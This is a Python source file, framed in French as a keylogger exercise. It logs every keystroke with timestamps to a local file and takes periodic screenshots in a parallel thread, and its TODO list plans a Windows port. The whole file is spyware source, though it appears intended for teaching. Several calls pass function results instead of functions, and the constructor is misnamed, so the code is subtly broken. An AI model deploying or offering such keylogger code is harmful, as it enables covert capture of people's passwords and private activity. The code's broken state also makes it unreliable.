#-*-coding:UTF-8 -*
#!/usr/bin/env python

""" Exercice: keylogger

Dans un premier temps, nous verrons comment mettre en place un keylogger simple en utilisant le paradigme objet de python.
Nous améliorerons le script en lançant en parallele un module capable de prendre des captures d'écran grace aux module mss et threading.


# TODO
- adapt to windows
- improve efficiency (stop opening/closing the log every keystroke)
"""

from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import time
import os


class IntervalTimer(Timer):
	"""
	Inherit run Threading.Timer
	This allow us to create timer in a separate thread os that we can use it as we want
	as a IntervalTimer object will still have Thread properties.
	"""
	def run(self):
		while not self.finished.wait(self.interval):
			self.function(*self.args, **self.kwargs)


class Monitor:
	def init(self):
		pass

	def _on_press(self, k):
		"""
		:param k: keypress object that occurs
		:return:
		"""
		with open("./logs/keylogs/log.txt", 'a') as f:
			f.write("{}\t{}\n".format(time.time(), k))
		pass

	def _build_logs(self):
		if not os.path.exists("./logs"):
			os.mkdir('./logs')
			os.mkdir('./logs/screenshots')
			os.mkdir('./logs/keylogs')

	def _keylogger(self):
		with Listener(on_press=self._on_press()) as listener:
			listener.join() # join each individual keystroke

	def _screenshot(self):
		sct = mss()
		sct.shot(output="./logs/screenshots/{}.png".format(time.time()))

	def run(self, interval=1):
		""" Launch key logger and screenshot module
		:param interval: Ammount of time (in seconds) in between screenshots
		"""
		self._build_logs()
		Thread(target=self._keylogger()).start()
		IntervalTimer(interval, self._screenshot()).start()


if __name__ == "__main__":
	mon = Monitor()
	mon.run()
